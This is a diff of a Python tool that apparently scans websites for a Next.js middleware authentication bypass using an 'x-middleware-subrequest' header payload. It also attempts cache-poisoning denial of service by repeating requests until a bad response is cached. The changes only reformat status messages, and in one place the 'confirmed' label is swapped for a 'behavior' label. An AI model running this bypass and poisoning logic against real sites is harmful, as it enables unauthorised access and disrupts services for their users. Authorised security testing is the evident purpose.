@@ -74,7 +74,7 @@ def bypass_auth(url_p, req):
             req_bypass = requests.get(url_p, headers=headers, verify=False, timeout=10, allow_redirects=False)
             #print(f"{url_p} :: {req_bypass}")                  
             if req_bypass.status_code not in range(300, 500) and req_bypass.status_code != req.status_code:
-                print(f"\033[31m └── [VULNERABILITY CONFIRMED]\033[0m | BYPASS {req.status_code} > {req_bypass.status_code} | {len(req.content)}b > {len(req_bypass.content)}b | \033[34m{url_p}\033[0m | PAYLOAD: x-middleware-subrequest: {middleware_name}")
+                print(f" {Identify.confirmed} | BYPASS {req.status_code} > {req_bypass.status_code} | {len(req.content)}b > {len(req_bypass.content)}b | \033[34m{url_p}\033[0m | PAYLOAD: x-middleware-subrequest: {middleware_name}")
         except Exception as e:
             #traceback.print_exc()
             pass
@@ -119,12 +119,12 @@ def cache_p(url, req_main, headers):
                 url_cp = f"{url}?cb={random.randrange(999)}"
                 req_cp = requests.get(url_cp, headers=headers, verify=False, timeout=10, allow_redirects=False)
                 if req_cp.status_code not in [307, 308, 304, 301, 302]:
-                    print(f"\033[33m └── [INTERESTING BEHAVIOR]\033[0m | CPDoSError {req_cb.status_code} > {req_cp.status_code} | \033[34m{url_cp}\033[0m | PAYLOAD: x-middleware-subrequest: {middleware_name}")
+                    print(f" {Identify.behavior} | CPDoSError {req_cb.status_code} > {req_cp.status_code} | \033[34m{url_cp}\033[0m | PAYLOAD: x-middleware-subrequest: {middleware_name}")
                     for _ in range(0, 5):
                         requests.get(url_cp, headers=headers, verify=False, timeout=10, allow_redirects=False)
                     req_cp_verify = requests.get(url_cp, verify=False, timeout=10, allow_redirects=False)
                     if req_cp.status_code == req_cp_verify.status_code:
-                        print(f"\033[31m └── [VULNERABILITY CONFIRMED]\033[0m | CPDoSError {req_cb.status_code} > {req_cp.status_code} | \033[34m{url_cp}\033[0m | PAYLOAD: x-middleware-subrequest: {middleware_name}")
+                        print(f" {Identify.behavior} | CPDoSError {req_cb.status_code} > {req_cp.status_code} | \033[34m{url_cp}\033[0m | PAYLOAD: x-middleware-subrequest: {middleware_name}")
     except requests.Timeout:
         #print(f"request timeout {url} {p}")
         pass
